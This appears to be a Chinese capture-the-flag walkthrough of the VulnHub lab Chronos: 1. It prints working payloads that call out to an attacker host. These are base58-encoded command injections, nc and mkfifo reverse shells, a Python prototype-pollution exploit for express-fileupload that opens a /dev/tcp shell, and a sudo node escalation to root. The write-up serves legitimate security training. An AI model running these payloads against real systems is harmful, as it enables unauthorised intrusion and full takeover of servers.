靶机地址：[Chronos: 1 ~ VulnHub](https://www.vulnhub.com/entry/chronos-1,735/)
主机发现
```Shell
sudo arp-scan -l
# 发现 192.168.1.29
sudo netdiscover -r 192.168.1.1/24
```
端口扫描
```Shell
sudo nmap -p- 192.168.1.29
# 22 80 8000
```
服务枚举
```Shell
sudo nmap -p22,80,8000 -sV 192.168.1.29
# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
# 8000/tcp open  http    Node.js Express framework
```
访问80端口的web服务，没有什么特别的。
尝试查看前端源代码，是经过编码、混淆的，直接看看不懂，需要用到 [CyberChef](https://gchq.github.io/CyberChef/) 解密。
```
# 将原始字符串复制到Input框中
# Operations中搜索需要的模块
# 搜索JavaScript Beautify 将其拖动到Recipe中
```
发现如下字符串
```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```
还记得之前端口扫描的时候，目标靶机也开放了8000端口
使用BurpSuite，拦截访问请求，将响应中的 `chronos.local` 替换成 `192.168.1.29` 。可以看到页面发生变化。
还要将 `^User-Agent.*$` 替换成 `User-Agent: Chronos`
重新观察这个请求，Send to Repeater
修改format参数的值发现无法请求成功
对 `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL` 进行解码，放到 [CyberChef](https://gchq.github.io/CyberChef/) 中，使用Magic模块，成功破解，使用了base58编码，解码后内容如下
```
'+Today is %A, %B %d, %Y %H:%M:%S.'
```
再参考响应的内容
```
Today is Thursday, November 24, 2022 07:20:54. 
```
这与命令
```Shell
date '+Today is %A, %B %d, %Y %H:%M:%S.'
```
的输出结果一致
考虑尝试命令注入
先对 `; id` 进行base58编码，选择 `To Base58` 模块，编码后的结果作为format参数发送请求，响应结果为Something went wrong。
再尝试对 `&&ls` 进行编码，再次请求，发现请求成功了，说明可以进行代码注入，这里说明要多尝试，一次失败不能代表什么。
查看靶机上有哪些工具可以使用，对如下字符串进行编码，作为参数
```
; ls /bin/
```
发现有 `nc` ，但是不知道其版本是否可以使用-e参数。
```
; nc 192.168.1.26 4444 -e /bin/sh
```
失败了，说明不支持-e参数
使用 `nc` 串联
```
; nc 192.168.1.26 4444 | /bin/bash | nc 192.168.1.26 5555
```
或
```
; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.26 4444 > /tmp/f
```
虽然页面的提示还是失败，但是成功获取到了shell
搜集敏感信息
```Shell
cat /etc/passwd | grep /bin/bash
```
发现两个用户： `root` 和 `imera`
查看 `imera` 的主目录下的文件
```Shell
ls -l /home/imera/
```
发现有一个 `user.txt` ，但是没有读取权限
考虑提升权限，先检查系统版本，看看有没有可以利用的内核漏洞
```Shell
uname -a
```
并没有找到合适的、可利用的漏洞
查找SUID文件
```Shell
find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
```
也没有找到可执行的SUID文件
还是要回到信息收集
查看当前目录下的 `app.js` 文件源码
```JavaScript
if (concat.includes('id') || concat.includes('whoami') || concat.includes('python') || concat.includes('nc') || concat.includes('bash') || concat.includes('php') || concat.includes('which') || concat.includes('socat')) {
	res.send("Something went wrong");
}
```
这段代码解释了，为什么之前命令注入会失败。
```JavaScript
if (agent === 'Chronos') {
	// ...
} else {
	res.send("Permission Denied");
}
```
这段代码解释了，为什么访问会出现Permission Denied。
再查看 `package.json`
```Json
{
  "dependencies": {
    "bs58": "^4.0.1",
    "cors": "^2.8.5",
    "express": "^4.17.1"
  }
}
```
继续信息收集
```Shell
pwd
# /opt/chronos
ls ..
# chronos
# chronos-v2
ls -l ../chronos-v2
# backend
# frontend
# index.html
ls -l ../chronos-v2/backend
# node_modules
# package.json
# package-lock.json
# server.js
cat ../chronos-v2/backend/package.json
cat ../chronos-v2/backend/server.js
```
`package.json`
```Json
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}
```
`server.js`
```JavaScript
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});
```
这里的代码也解释了为什么我们没有扫描到8080这个端口：因为绑定了ip，只有本机可以访问到。
经过查找，库 `express-fileupload` 存在已知漏洞。
参考链接：[Real-world JS - 1 (p6.is)](https://blog.p6.is/Real-World-JS-1/)
参考作者的说明，现在本地创建利用的Python脚本
`EXP_express-fileupload.py`
```Python
import requests
cmd = 'bash -c "bash -i &> /dev/tcp/192.168.1.26/8888 0>&1"'
# pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
# execute command
requests.get('http://127.0.0.1:8080')
```
本地开启http服务
```Shell
python3 -m http.server 7331
```
靶机上下载漏洞利用脚本
```Shell
wget http://192.168.1.26:7331/EXP_express-fileupload.py
```
本机开启侦听端口
```Shell
ncat -nvlp 8888
```
靶机上执行脚本
```Shell
python3 EXP_express-fileupload.py
```
成功获取反弹Shell
```Shell
id
# uid=1000(imera) gid=1000(imera) groups=1000(imera),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
发现获取到的Shell是 `imera` 的，还是需要提权
获取第一个flag
```Shell
cd
cat user.txt
# byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
```
尝试sudo提权
```Shell
sudo -l
#    (ALL) NOPASSWD: /usr/local/bin/npm *
#    (ALL) NOPASSWD: /usr/local/bin/node *
```
发现可以不需要密码执行 `node`
```Shell
sudo node -e 'child_process.spawn("/bin/bash",{stdio:[0,1,2]})'
```
提权成功
获取第二个flag
```Shell
cat /root/root.txt
# YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```
两个flag内容通过CyberChef网站解密，再通过Google翻译内容如下：

时间飞逝我的朋友。
今晚我们在沉默中收集梦想。